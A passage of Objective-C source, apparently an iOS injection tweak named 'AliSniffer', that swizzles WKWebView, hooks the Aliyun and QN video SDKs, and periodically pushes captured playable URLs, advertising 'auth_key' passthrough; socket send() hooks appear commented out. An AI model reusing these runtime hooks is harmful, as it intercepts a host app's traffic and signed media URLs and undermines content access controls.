                if (mi) { orig_WK_init = (void *)method_getImplementation(mi); method_setImplementation(mi, (IMP)swz_WK_init); }
                LOG(@"[AliSniffer] WKWebView injection installed (MSE sampling + fetch/XHR)");
            }

            // Install Aliyun / QN hooks
            InstallAliyunHooks();
            InstallQNHooks();

            // Optional: libcurl / socket hooks (commented out by default)
#if SNIFFER_IOS16_ENABLE_LIBCURL
            // HookCurlIfPresent();
#endif
            // If you want socket-level hints, uncomment and rebind send()
            // struct rebinding rb = {"send", (void*)hook_send, (void**)&orig_send}; rebind_symbols(&rb, 1);

            // periodic push (keep last URL pushing)
            [NSTimer scheduledTimerWithTimeInterval:kPushInterval repeats:YES block:^(__unused NSTimer * _Nonnull t) {
                if (g_lastPlayableURL.length) PushLatestURL_Raw(g_lastPlayableURL, nil);
            }];

#if SNIFFER_ENABLE_POPUP
            ShowPopupIfNeeded(@"AliSniffer 已加载", @"增强版已启用：auth_key直通 + 多入口兜底（MSE/WS/AV/NSURLProtocol/CFReadStream/Aliyun/QN）");
#endif
        });
    }
}
